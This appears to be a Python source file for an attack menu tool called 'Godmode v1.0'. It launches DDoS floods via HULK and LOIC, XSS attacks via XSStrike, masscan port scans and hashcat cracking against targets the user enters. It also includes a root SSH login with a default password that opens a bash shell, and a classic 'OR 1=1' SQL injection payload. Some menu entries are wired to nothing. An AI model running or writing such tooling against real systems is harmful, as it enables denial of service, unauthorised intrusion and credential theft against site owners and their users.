import os
import socket
from bs4 import BeautifulSoup
import re
import hashlib
from colorama import init, Fore, Style
import os
import platform

import paramiko
import urllib.parse
import requests
import time
import subprocess

# Initialize colorama for cross-platform color support
init()

# Pause
def pause_and_countdown():
    # Pause for 3 seconds
    time.sleep(3)

# CLearing Console
def clear_console():
    os_name = platform.system().lower()
    if os_name == "windows":
        os.system("cls")  # For Windows
    elif os_name in ["linux", "darwin"]:
        os.system("clear")  # For Linux and macOS
    else:
        # Other operating systems that may not be supported
        print("Console clear not supported for this OS.")

# Function to perform stealthy port scanning using Masscan
def stealthy_port_scanner(target_ip):
    print(f"\n{Fore.YELLOW}Initiating Stealthy Port Scan on {target_ip}...")
    subprocess.run(["masscan", "--open", "-p1-65535", "--rate", "1000", target_ip])

# Function to perform XSS attack using XSStrike
def xss_attack(target_url, options):
    command = ["python3", "modules/XSstrike/xsstrike.py", "-u", target_url]
    if options.get('proxy'):
        command.append("--proxy")
    if options.get('data'):
        command.extend(["--data", options['data']])
    if options.get('encode'):
        command.extend(["--encode", options['encode']])
    if options.get('fuzzer'):
        command.append("--fuzzer")
    if options.get('timeout'):
        command.extend(["--timeout", options['timeout']])
    if options.get('crawl'):
        command.append("--crawl")
    if options.get('json'):
        command.append("--json")
    if options.get('path'):
        command.append("--path")
    if options.get('seeds'):
        command.extend(["--seeds", options['seeds']])
    if options.get('file'):
        command.extend(["-f", options['file']])
    if options.get('level'):
        command.extend(["-l", options['level']])
    if options.get('headers'):
        command.extend(["--headers", options['headers']])
    if options.get('threads'):
        command.extend(["-t", options['threads']])
    if options.get('delay'):
        command.extend(["-d", options['delay']])
    if options.get('skip'):
        command.append("--skip")
    if options.get('skip_dom'):
        command.append("--skip-dom")
    if options.get('blind'):
        command.append("--blind")

    print(f"\n{Fore.YELLOW}Performing XSS Attack on {target_url}...")
    subprocess.run(command)

# Function to execute an advanced DDoS attack using HULK
def advanced_ddos_attack(target_url):
    print(f"\n{Fore.YELLOW}Launching Advanced DDoS Attack on {target_url}...")
    subprocess.run(["python3", "HULK/hulk.py", "-site", target_url])

# Function to execute a DDoS attack using LOIC (Low Orbit Ion Cannon)
def ddos_attack(target_url):
    print(f"\n{Fore.YELLOW}Launching DDoS Attack on {target_url} using LOIC...")
    loic_path = "LOIC/loic.py"
    subprocess.run(["python3", loic_path, target_url])

# Function to perform advanced password cracking using Hashcat
def advanced_password_cracker(hash_file):
    print(f"\n{Fore.YELLOW}Cracking Passwords using Advanced Techniques...")
    subprocess.run(["hashcat", "-a", "0", "-m", "1000", hash_file, "rockyou.txt"])

# Function to deploy a stealthy reverse shell using Paramiko and Netcat
def stealthy_reverse_shell(target_ip, port):
    print(f"\n{Fore.YELLOW}Deploying Stealthy Reverse Shell to {target_ip}:{port}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target_ip, port=22, username="root", password="password")
        ssh_session = client.get_transport().open_session()
        ssh_session.exec_command("/bin/bash")
        print(ssh_session.recv(1024))
    except paramiko.AuthenticationException:
        print(f"{Fore.RED}Authentication failed. Check your credentials.")
    except paramiko.SSHException as e:
        print(f"{Fore.RED}SSH connection failed: {e}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")
    finally:
        client.close()

# Function to perform SQL injection attack
def sql_injection(target_url):
    print(f"\n{Fore.YELLOW}Initiating SQL Injection Attack on {target_url}...")
    payload = f"' OR '1'='1' -- "
    url = urllib.parse.urljoin(target_url, f"/vulnerable_endpoint?username={payload}")
    try:
        response = requests.get(url)
        if "Welcome admin" in response.text:
            print(f"{Fore.GREEN}SQL Injection successful! Admin privileges granted.")
        else:
            print(f"{Fore.RED}SQL Injection unsuccessful.")
    except requests.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

# Function to display the main menu
def display_main_menu():
    clear_console()
    print(f"{Fore.LIGHTYELLOW_EX}" + "⌠" + "═" * 38 + "⌡")
    print(f" Program        Godmode v1.0")
    print(f" Team           NEO")
    print(f" Developer      ShowingTruth")
    print(f" Link           https://tinyurl.com/yxzw4749")
    print(f"⌠" + "═" * 38 + "⌡")
    print(f"{Fore.RED} [ 1 ] BlackHat || v1.0")
    print(f"{Fore.WHITE} [ 2 ] GreyHat || v1.0")
    print(f"{Fore.GREEN} [ 3 ] TOOLS || Exit{Style.RESET_ALL}")
    print(f"{Fore.GREEN} [ 4 ] TOOLS || Balance")

# Function to display the Black Hat operations menu
def display_black_hat_menu():
    clear_console()
    print("=" * 40)
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "=== Black Hat Operations ===" + " " * 5 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "Choose your tool:" + " " * 16 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "1. Stealthy Port Scanner" + " " * 9 + "|")
    print("|" + " " * 5 + "2. XSS Attack" + " " * 20 + "|")
    print("|" + " " * 5 + "3. Advanced DDoS Attack" + " " * 10 + "|")
    print("|" + " " * 5 + "4. DDoS Attack" + " " * 19 + "|")
    print("|" + " " * 5 + "5. Advanced Password Cracker" + " " * 5 + "|")
    print("|" + " " * 5 + "6. Back" + " " * 26 + "|")
    print("|" + " " * 38 + "|")
    print("=" * 40)

# Function to display the Grey Hat operations menu
def display_grey_hat_menu():
    clear_console()
    print("=" * 40)
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "=== Grey Hat Operations ===" + " " * 6 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "Choose your tool:" + " " * 16 + "|")
    print("|" + " " * 38 + "|")
    print("|" + " " * 5 + "1. Stealthy Port Scanner" + " " * 9 + "|")
    print("|" + " " * 5 + "2. XSS Attack" + " " * 20 + "|")
    print("|" + " " * 5 + "3. Advanced DDoS Attack" + " " * 10 + "|")
    print("|" + " " * 5 + "4. Advanced Password Cracker" + " " * 5 + "|")
    print("|" + " " * 5 + "5. Back" + " " * 26 + "|")
    print("|" + " " * 38 + "|")
    print("=" * 40)

# Main function to manage user interaction
def main():
    clear_console()
    while True:
        display_main_menu()
        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")

        if choice == "1":  # Black Hat Operations
            while True:
                display_black_hat_menu()
                choice = input(f"{Fore.MAGENTA}Enter your choice: {Style.RESET_ALL}")

                if choice == "1":
                    target_ip = input(f"{Fore.MAGENTA}Enter target IP address: {Style.RESET_ALL}")
                    stealthy_port_scanner(target_ip)
                elif choice == "2":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")

                    options = {}
                    use_proxy = input(f"{Fore.MAGENTA}Use proxy? (y/n): {Style.RESET_ALL}").strip().lower()
                    if use_proxy == 'y':
                        options['proxy'] = True

                    # Ask for additional options if needed
                    if input(f"{Fore.MAGENTA}Do you want to specify additional options? (y/n): {Style.RESET_ALL}").strip().lower() == 'y':
                        options['data'] = input(f"{Fore.MAGENTA}Enter post data (if any): {Style.RESET_ALL}")
                        options['encode'] = input(f"{Fore.MAGENTA}Encode payloads? (y/n): {Style.RESET_ALL}").strip().lower()
                        if options['encode'] == 'y':
                            options['encode'] = input(f"{Fore.MAGENTA}Enter encode method: {Style.RESET_ALL}")
                        options['fuzzer'] = input(f"{Fore.MAGENTA}Use fuzzer? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                        options['timeout'] = input(f"{Fore.MAGENTA}Enter timeout (if any): {Style.RESET_ALL}")
                        options['crawl'] = input(f"{Fore.MAGENTA}Enable crawling? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                        options['json'] = input(f"{Fore.MAGENTA}Treat post data as json? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                        options['path'] = input(f"{Fore.MAGENTA}Inject payloads in the path? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                        options['seeds'] = input(f"{Fore.MAGENTA}Load crawling seeds from a file (if any): {Style.RESET_ALL}")
                        options['file'] = input(f"{Fore.MAGENTA}Load payloads from a file (if any): {Style.RESET_ALL}")
                        options['level'] = input(f"{Fore.MAGENTA}Level of crawling: {Style.RESET_ALL}")
                        options['headers'] = input(f"{Fore.MAGENTA}Add headers (if any): {Style.RESET_ALL}")
                        options['threads'] = input(f"{Fore.MAGENTA}Number of threads: {Style.RESET_ALL}")
                        options['delay'] = input(f"{Fore.MAGENTA}Delay between requests (if any): {Style.RESET_ALL}")
                        options['skip'] = input(f"{Fore.MAGENTA}Skip asking to continue? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                        options['skip_dom'] = input(f"{Fore.MAGENTA}Skip DOM checking? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
                        options['blind'] = input(f"{Fore.MAGENTA}Inject blind XSS payload while crawling? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'

                    xss_attack(target_url, options)
                elif choice == "3":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    advanced_ddos_attack(target_url)
                elif choice == "4":
                    target_url = input(f"{Fore.MAGENTA}Enter target URL: {Style.RESET_ALL}")
                    ddos_attack(target_url)
                elif choice == "5":
                    hash_file = input(f"{Fore.MAGENTA}Enter path to hash file: {Style.RESET_ALL}")
                    advanced_password_cracker(hash_file)
                elif choice == "6":
                    break
                else:
                    print(f"{Fore.RED}Invalid choice. Please enter a valid option.\n")
                    clear_console()

if __name__ == "__main__":
    main()
